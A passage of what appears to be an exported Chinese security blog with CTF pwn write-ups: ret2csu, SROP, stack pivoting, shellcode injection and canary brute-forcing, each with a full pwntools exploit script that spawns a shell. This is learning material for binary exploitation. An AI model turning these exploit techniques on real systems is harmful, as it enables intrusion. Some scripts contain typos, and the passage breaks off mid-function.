loc_400580，jnz是不相等时跳转，我们通常并不想跳转到0x400580这个地方，因为此刻执行这三个指令的时候，我们就是从0x400580这个地址过来的。因此rbx加一之后，我们要让它和rbp相等，因此rbp就要提前被设置成1.<br>r12要存放的就是指向（我们要跳转到那个地址）的地址。这里有个很重要的小技巧，如果你不想使用这个call，或者说你想call一个函数，但是你拿不到它的got地址，因此没法使用这个call，那就去call一个空函数（_term_proc函数）（并且要注意的是，r12的地址填写的并不是_term_proc的地址，而是指向这个函数的地址）。<br>r13,r14,r15这三个值分别对应了rdx,rsi,edi。这里要注意的是，r15最后传给的是edi,最后rdi的高四字节都是00，而低四字节才是r15里的内容。（也就是说如果想用ret2csu去把rdi里存放成一个地址是不可行的）</p><p><strong>填充图</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011314600.png" alt="image-20230729011314600"></p><p>注意gadget末尾有个ret p64（8）占位</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011813031.png" alt="image-20230729011813031"></p><p>为什么要将system函数地址写入bss段? 因为这行代码call qword ptr [r12+rbx*8]是<u>间接跳转</u>，也就是先将r12地址的值取出来，再进行跳转(想想Lazy Binding)。最后的效果就是，从bss_addr中取出system函数的地址，再跳转到system函数处。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729012308773.png" alt="image-20230729012308773"></p><p>exp</p><pre><code class="python">from pwn import *from LibcSeacher import *#context.log_level = &#39;debug&#39;p = process(&#39;./level&#39;)elf = ELF(&#39;./level&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)write_got = elf.got[&#39;write&#39;]read_got = elf.got[&#39;read&#39;]main_addr = 0x400564bss_addr = 0x601028gadget1 = 0x400606gadget2 = 0x4005F0payload1 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got)payload1 += p64(8) + p64(gadget2) + cyclic(0x38) + p64(main_addr)p.sendlineafter(&#39;/n&#39;, payload1)sleep(1)write_addr = u64(p.recv(8))sys_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])payload2 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_addr)payload2 += p64(16) + p64(gadget2) + cyclic(0x38) + p64(main_addr)p.sendlineafter(&#39;/n&#39;, payload2)sleep(1)p.send(p64(sys_addr))p.send(&quot;/bin/sh/x00&quot;)payload3 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0)payload3 += p64(0) + p64(gadget2) + &#39;/x00&#39; * 0x38 + p64(main_addr)sleep(1)p.sendlineafter(&#39;/n&#39;, payload3)p.interactive()</code></pre><h3 id="其他题目"><a href="#其他题目" class="headerlink" title="其他题目"></a>其他题目</h3><h4 id="ciscn-2019-es-7（其实SROP）"><a href="#ciscn-2019-es-7（其实SROP）" class="headerlink" title="ciscn_2019_es_7（其实SROP）"></a>ciscn_2019_es_7（其实SROP）</h4><p>（1）checksec （名字太长就给改成a了w）</p><p>​    <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729160314382.png" alt="image-20230729160314382"></p><p>（2）Good woman IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164657543.png" alt="image-20230729164657543"></p><p>  偏移0x18<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164622920.png" alt="image-20230729164622920"></p><p>查看vuln函数发现两个系统调用：read和write 以及syscall函数</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164913572.png" alt="image-20230729164913572"></p><p>同时rax被改成了0x3B，对应调用execve函数.</p><p>使用ROPgadget查看可利用的gadget.<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729165814524.png" alt="image-20230729165814524"></p><p>可以看到我们只能单独控制rdi，不能控制rsi，rdx的值.那就ret2csu（当然专题废话hh）控制rdx和rsi参数，最后执行mov rax，0x3b； syscall即可.</p><p>so 难点来了：怎么把参数地址存入rdi？<br>由于我们控制不了rax的值，无法使用系统调用将其设置为0.bss段写不了，只能写入程序给我们的特定位置来了，意味着我们需要泄露栈上的地址.看看程序是否为我们提供了可以利用的代码.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171034681.png" alt="image-20230729171034681"></p><p>第三个参数为0x30</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171514964.png" alt="image-20230729171514964"></p><p>buf距离栈顶只有10字节距离，因此write函数可以打印出栈中内容.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172115885.png" alt="image-20230729172115885"></p><p>测试只能显示48字节 gdb调式0x30刚刚好（具体之后补充）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172330284.png" alt="image-20230729172330284"></p><p>先发送1然后gdb查看<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729224838828.png" alt="image-20230729224838828"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729231040910.png" alt="image-20230729231040910"></p><p>泄露的内容是红线的部分（当然由于只能泄露0x30个字节，我红线圈多了，但是我想强调的是栈地址泄露，泄露的是内容，而非栈的地址）</p><p>不过我们发现了第一个和第三个泄露的栈中的内容是指向了栈的地址，这样我们就可以用泄露的栈的内容配合偏移，来获取栈的地址了.</p><p>经过调试发现，vul函数的返回地址就是此时栈顶的，我们是要劫持程序的执行流，因此第一个地址肯定是没法泄露了，我们来泄露第三个栈的内容。然后把返回地址填写成vul函数的首地址，让程序再执行一次（去进行ret2csu）</p><p>拿到栈中第三个内容后，看一下它距离我们输入的内容的首地址偏移是多少.<br><img src="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171939424-200600591.png" alt="img"></p><p>exp：</p><pre><code class="python">from pwn import *from LibcSearcher import *context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)p = remote(&#39;node4.buuoj.cn&#39;, 26250)#p = process(&#39;./a&#39;)e = ELF(&#39;./a&#39;)csu_gadget1 = 0x40059Amodify_rax = 0x4004E2csu_gadget2 = 0x400580term_proc = 0x600e50#pwndbg&gt;search -p 地址 查找bss_addr = 0x601030pop_rdi_addr = 0x4005a3syscall_addr = 0x400517read_syscall = 0x4004EDoffset = 16payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;\x00&#39;).encode() + p64(read_syscall)p.send(payload)p.recvuntil(b&#39;\x05\x40\x00\x00\x00\x00\x00&#39;)leak_addr = u64(p.recv(8))print(hex(leak_addr))bin_sh_addr = leak_addr - 280print(hex(bin_sh_addr))payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;\x00&#39;).encode() + p64(csu_gadget1)payload += p64(0) + p64(1)payload += p64(term_proc)payload += p64(0) + p64(0) + p64(0)payload += p64(csu_gadget2)payload += b&#39;a&#39; * 56payload += p64(modify_rax)payload += p64(pop_rdi_addr) + p64(bin_sh_addr)payload += p64(syscall_addr)p.send(payload)p.interactive()</code></pre><h4 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h4><p>其实可以直接ret2libc（🤡）w 学习记录了</p><pre><code class="python">from pwn import *from LibcSearcher import *r=remote(&#39;node4.buuoj.cn&#39;,25408)bank=0x0601080leave=0x400699puts_plt=0x04004E0puts_got=0x0601018pop_rdi=0x400703main=0x0400626ret=0x4004c9r.recvuntil(&#39;u want&#39;)payload=b&#39;a&#39;*0x60+p64(bank)+p64(leave)r.send(payload)r.recvuntil(&#39;now!&#39;)payload=p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)r.send(payload)r.recvline()puts_addr=u64(r.recv(6).ljust(8,b&#39;\x00&#39;))print(hex(puts_addr))libc=LibcSearcher(&#39;puts&#39;,puts_addr)libc_base=puts_addr-libc.dump(&#39;puts&#39;)one_gadget=libc_base+0x4526a#system=libc_base+libc.dump(&#39;system&#39;)#binsh=libc_base+libc.dump(&#39;str_bin_sh&#39;)#payload=b&#39;a&#39;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)payload=b&#39;a&#39;*(0x60+8)+p64(one_gadget)r.send(payload)r.interactive()</code></pre><p><strong>思路：</strong>利用puts函数泄露libc得到 在bss段上写入利用rop写入shellcode</p><p><strong>问题：</strong>buf只有0x10大小，如何在bss段顺利写入呢？<br><strong>Answer：</strong>buf只能覆盖到ret，但bank（）在bss段<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005633820.png"></p><p>在buf处利用leave指令劫持栈跳转到bank处，写入shellcode</p><p>（1）checksec</p><p>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731004821556.png" alt="image-20230731004821556"></p><p>（2）Lovely Woman  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005122883.png" alt="image-20230731005122883"></p><p>NX保护打开，栈上无system（）和”&#x2F;bin&#x2F;sh” -&gt;libc泄露</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005742112.png" alt="image-20230731005742112"></p><p>exp</p><pre><code class="python">from pwn import *p=process(&#39;./stack&#39;)context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)e=ELF(&#39;./stack&#39;)libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)puts_plt_addr=e.plt[&#39;puts&#39;]puts_got_addr=e.got[&#39;puts&#39;]read_plt_addr=e.got[&#39;read&#39;]#why got here #call函数为跳转到某地址内所保存的地址，应该使用got表中的地址pop_rdi_addr=0x400703level_addr=0x400699bss_addr=0x601080#bank_addrret_csu_addr=0x4006FArsi_addr=0x601118payload1=b&#39;a&#39;*0x60+p64(bss_addr+0x40)+p64(level_addr)#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据p.sendafter(&#39;u want\n&#39;,payload1)payload2=b&#39;a&#39;*0x40+p64(0)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)payload2+=p64(ret_csu_addr)+p64(0)+p64(0)+p64(read_plt_addr)+p64(0x100)payload2+=p64(rsi_addr)+p64(0)+p64(0x4006E0)#why is there an address here#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行p.sendafter(&#39;k now!\n&#39;,payload2)puts_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))libc_base=puts_addr-libc.symbols[&#39;puts&#39;]one_gadget=libc_base+0x4f432p.sendline(p64(one_gadget))#why p64 here #只要是发送地址 就要经过打包之后发送p.interactive()</code></pre><p>❗❗❗u1s1❗❗❗<br>不管用哪个方法，都需要考虑利用函数（bank）与got表间距离.在栈迁时需要把地址相对抬高些，防止破坏got表.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731155611578.png" alt="image-20230731155611578"></p><p>下附栈迁移相关资料：</p><p>[]: <a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">https://www.cnblogs.com/ZIKH26/articles/15817337.html</a></p><p><strong>tips：</strong>没法泄露libc时可用one_gadget，利用在线网站</p><p>[]: <a href="https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64">https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64</a></p><p>将泄露函数（本题为puts 其他函数是否相同 有待考究）的后三位，找到libc版本</p><pre><code>$ one_gadget libc版本</code></pre>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部分PWN题目记录</title>
      <link href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwn题目记录"><a href="#Pwn题目记录" class="headerlink" title="Pwn题目记录"></a><strong>Pwn题目记录</strong></h3><h3 id="【NKCTF】"><a href="#【NKCTF】" class="headerlink" title="【NKCTF】"></a>【NKCTF】</h3><p>弱小可怜无助的唯一。<br>（1）checkesec 发现为64位 只有NX保护<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530231132244.png" alt="image-20230530231132244"></p><p>（2）进IDA分析 </p><p>  F5查看main函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234240598.png"></p><p>  查看偏移为0x74（buf[108]+8[ebp大小]） buf2大小随机  无后门函数 此时联想到使用pwntools生成可利用的shellcode   v6随机执行但未设置随机数种子【注释打漏了😜】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234339502.png" alt="image-20230530234339502"><br>exp：</p><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.os = &#39;linux&#39;context.log_level = &#39;debug&#39;p = process(&#39;./pwn&#39;)#p = remote(&#39;127.0.0.1&#39;, 1337)buf = b&#39;\x90&#39; * 108shellcode = asm(shellcraft.amd64.sh())payload = buf + b&#39;\x90&#39;*(104-len(shellcode)) +shellcodelog.success(&quot;shellcode_len : &quot; + hex(len(shellcode)))p.sendline(payload)p.interactive()    </code></pre><p>选择用\x90（nop）进行填充使得攻击代码更具稳定性<br>104减去shellcode长度的b’\x90’字节，这个部分作用是将shellcode挪到最后（shellcode可能在中间生成），如果没有nopsled的填充，后面的数据会覆盖前面的shellcode，从而导致攻击失败。也就是说，这部分的填充是为了让Shellcode不会被后面的数据覆盖。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531002410442.png" alt="image-20230531002410442"></p><p>统统通</p><h3 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a><strong>ez_stack</strong></h3><p>(1)checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150721336.png" alt="image-20230531150721336"></p><p>发现NX打开 准备进IDA找溢出</p><p>（2）进IDA<br>  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150942976.png" alt="image-20230531150942976"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531151017632.png" alt="image-20230531151017632"></p><p>​       发现溢出部分 无”&#x2F;bin&#x2F;sh” 需要我们构造rop链自行写入<br>​       常规思路就是第一次rop往<a href="https://so.csdn.net/so/search?q=bss&spm=1001.2101.3001.7020">bss</a>上写&#x2F;bin&#x2F;sh，然后第二次调用execve<br>​       但程序本身没有本地直接调用函数-&gt;通过syscall来得到shell<br>​       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531170223533.png" alt="image-20230531170223533"></p><p> 查看发现为SROP  在.data段找到可写入&#x2F;bin&#x2F;sh的地址</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531160459228.png" alt="image-20230531160459228"> </p><p>执行完 read 的系统调用，此时 rax &#x3D;&#x3D; 0  利用SROP 【只用于可写方法内】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531171529997.png" alt="image-20230531171529997"></p><p>exp:</p><pre><code class="python">from pwn import *p = process(&#39;./stack&#39;)#p = remote(&#39;node2.yuzhian.com.cn&#39;,35543)context(os = &#39;linux&#39;,arch = &#39;amd64&#39;,log_level = &#39;debug&#39;)elf = ELF(&#39;./stack&#39;)libc = elf.libcdef debug():    gdb.attach(p)    pause()syscall = 0x4011eemov_rax_15 = 0x401146bin_sh = 0x404040#call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = bin_shsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rip = syscall#debug()payload = &#39;a&#39;*(0x10 + 0x8)payload += p64(0x4011C8)payload += p64(0)payload += p64(mov_rax_15)payload += p64(syscall)payload += str(sigframe)sleep(0.1)p.sendlineafter(&#39;F!\n&#39;,payload)#debug()sleep(0.1)p.sendline(&#39;/bin/sh\x00&#39;)sleep(0.1)p.sendline(&#39;\x00&#39;)p.interactive()</code></pre><p>SROP小赠品（<a href="https://www.cnblogs.com/bpcat/p/16879300.html">https://www.cnblogs.com/bpcat/p/16879300.html</a>)</p><h3 id="【2023CISCN】"><a href="#【2023CISCN】" class="headerlink" title="【2023CISCN】"></a>【2023CISCN】</h3><h4 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a><strong>shaokao</strong></h4><p>（1）虚拟机checksec一下</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/0.png" alt="0"></p><p>（2）运行一下程序玩玩</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/1.png" alt="1"></p><p>发现没碰到特别之处<br>（3）转战IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/2.png" alt="2"></p><p>查看mian函数发现隐藏目录5 跟踪看看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/3.png" alt="3"></p><p>发现strcpy 猜测v1进行了溢出</p><p>再往下翻翻<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/4.png" alt="4"></p><p>syscall  以及sys_exit 明显的系统调用号</p><p>到data段查找可写入口<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/5.png" alt="5"></p><p>搜索sys 发现-result 猜测负数（-10000）打开目录5<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527200932728.png"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/8.png" alt="8">（4）利用ROPgadget 构造所需execve系统调用exp<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/61.png" alt="61"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/6.png" alt="6"></p><p>（5）构造对应exp</p><pre><code class="python">from pwn import *from struct import packr=process(&#39;./shaokao&#39;)#r=remote(&#39;39.106.71.184&#39;,23931)r.sendlineafter(&quot;&gt;&quot;,b&quot;1&quot;)r.sendlineafter(&quot;&quot;,b&quot;1&quot;)r.sendlineafter(&quot;？\n&quot;,b&quot;-10000&quot;)r.sendlineafter(&quot;&gt;&quot;,b&quot;4&quot;)r.sendlineafter(&quot;&gt;&quot;,b&quot;5&quot;)p = b&#39;a&#39;*(0x28)p += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .datap += pack(&#39;&lt;Q&#39;, 0x0000000000458827) # pop rax ; retp += b&#39;/bin//sh&#39;p += pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p += pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; retp += pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack(&#39;&lt;Q&#39;, 0x000000000040264f) # pop rdi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .datap += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p += pack(&#39;&lt;Q&#39;, 0x00000000004a404b) # pop rdx ; pop rbx ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p += pack(&#39;&lt;Q&#39;, 0x4141414141414141) # paddingp += pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret _1p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710)p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710)p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret _59p += pack(&#39;&lt;Q&#39;, 0x0000000000402404) # syscallr.sendlineafter(&quot;烧烤摊儿已归你所有，请赐名：&quot;,p)r.interactive(）</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527201915278.png" alt="image-20230527201915278"></p><p>优化后的exp</p><pre><code class="python">from pwn import *from struct import packr=process(&#39;./shaokao&#39;)#r=remote(&#39;39.106.71.184&#39;,23931)r.sendlineafter(&quot;&gt;&quot;,b&quot;1&quot;)r.sendlineafter(&quot;&quot;,b&quot;1&quot;)r.sendlineafter(&quot;？\n&quot;,b&quot;-10000&quot;)r.sendlineafter(&quot;&gt;&quot;,b&quot;4&quot;)r.sendlineafter(&quot;&gt;&quot;,b&quot;5&quot;)padding = b&#39;a&#39; * 0x28pop_rsi_ret = pack(&#39;&lt;Q&#39;, 0x000000000040a67e) pop_rax_ret = pack(&#39;&lt;Q&#39;, 0x0000000000458827)mov_rax_ptr_rsi_ret = pack(&#39;&lt;Q&#39;, 0x000000000045af95)xor_rax_ret = pack(&#39;&lt;Q&#39;, 0x0000000000447339)pop_rdi_ret = pack(&#39;&lt;Q&#39;, 0x000000000040264f)pop_rdx_rbx_ret = pack(&#39;&lt;Q&#39;, 0x00000000004a404b)p = paddingp += pop_rsi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e0)   # @ .datap += pop_rax_ret + b&#39;/bin//sh&#39;p += mov_rax_ptr_rsi_retp += pop_rsi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e8)   # @ .data + 8p += xor_rax_retp += mov_rax_ptr_rsi_retp += pop_rdi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e0)   # @ .datap += pop_rsi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e8)   # @ .data + 8p += pop_rdx_rbx_ret + pack(&#39;&lt;Q&#39;, 0) + pack(&#39;&lt;Q&#39;, 0)p += xor_rax_retadd_rip_ret = pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retrop_len = 59rop_chain = [add_rip_ret] * rop_len#构建一个rop_len 完成execvep += b&#39;&#39;.join(rop_chain)#将列表转换为字符串进行填充p += pack(&#39;&lt;Q&#39;, 0x0000000000402404) # syscallr.sendlineafter(&quot;烧烤摊儿已归你所有，请赐名：&quot;,p)r.interactive()</code></pre><h4 id="【funcannary】"><a href="#【funcannary】" class="headerlink" title="【funcannary】"></a><strong>【funcannary】</strong></h4><p>涨知识涨知识 没学够的菜狗😀<br>（1）先运行一下 pei’d配套checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       根据题目提示’have fun’和’welcome’在爆破的exp中会用作于覆盖节点</p><p>​                              ​<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p><p>​         发现Canary和PIE都开 准备好爆破（如果有可以利用的字符串canary也可以绕过）<br>​         对应随机化 后续在IDA中只能利用其地址计算偏移</p><p>（2）进IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p><p>fork接口 &#x3D;&#x3D; canary爆破（多线程）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p><p>发现函数入口为0x122D 并且发现”&#x2F;bin&#x2F;cat flag” 接下来找溢出位置爆破cannary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p><p>明显溢出 定位该函数sub_128A（爆破canary的位置）爆破成功后爆返回地址 （爆canary地址的下一位）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p><p>函数入口为0x122D shell返回地址为1329 偏移为0xfc 覆盖的buf大小为0x62</p><p><strong>tips</strong><br>【1】canary大小为0x00-0xff 所以爆破时每字节需循环257次 又因为canary低三位定为\x00（32位爆破循环3次 64位循环7次）此处需循环7次<br>【2】程序入口点一般都是整数，即地址最低位为00，也就是这里的地址，0x29是可信的。就只要爆破后一位就OK，再后面的地址都相同，爆不爆都一样。</p><p>exp：</p><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.os = &#39;linux&#39;context.log_level = &#39;debug&#39;p = process(&quot;./fun&quot;)#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)p.recvuntil(b&#39;welcome\n&#39;) canary = b&#39;\x00&#39;#canaryfor k in range(7):  info(f&#39;No:&#123;K+1&#125;start,finding...&#39;)  for i in range(256):     p.send(b&#39;a&#39;*(0x70-8)+cannary+btyes([i]))     recv = p.recvuntil(b&#39;welcome\n&#39;)     if b&quot;have fun&quot; in recv:      cannary += bytes([i])      success(f&quot;canary =&gt; &#123;canary.hex()&#125;&quot;)      break      #return addressre_1 = 0x29re_2 = 0info(&#39;finding:re_2 ...&#39;)for re_i in range(0x100):  payload = b&#39;a&#39; * 0x68 + canary + b&#39;A&#39; * 8 + p8(re_1) + p8(re_i)#p8()将给定的整数转换为单字节的字节串  p.send(payload)  recv = p.recvuntil(b&quot;welcome\n&quot;)  if b&quot;have fun&quot; in recv:       re_2 = re_i       success(f&quot;re_2 =&gt; &#123;hex(re_2)&#125;&quot;)       breakpayload = b&#39;a&#39; * (0x70-8) + canary + b&#39;A&#39; * 8 + p8(re_1 - 1) + p8(re_2 - 1)#-1对齐栈p.send(payload)p.interactive()</code></pre><p>本地get<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530213510778.png" alt="image-20230530213510778">  </p><p><strong>login</strong><br>无附件 只打远程 涨知识捏 侧信道攻击 </p><p>exp:</p><pre><code class="python">from pwn import *from sys import argvcontext(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)def s(a):    p.send(a)def sa(a, b):    p.sendafter(a, b)def sl(a):    p.sendline(a)def sla(a, b):    p.sendlineafter(a, b)def r():    p.recv()def pr():    print(p.recv())def ru(a):    return p.recvuntil(a)def inter():    p.interactive()def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def 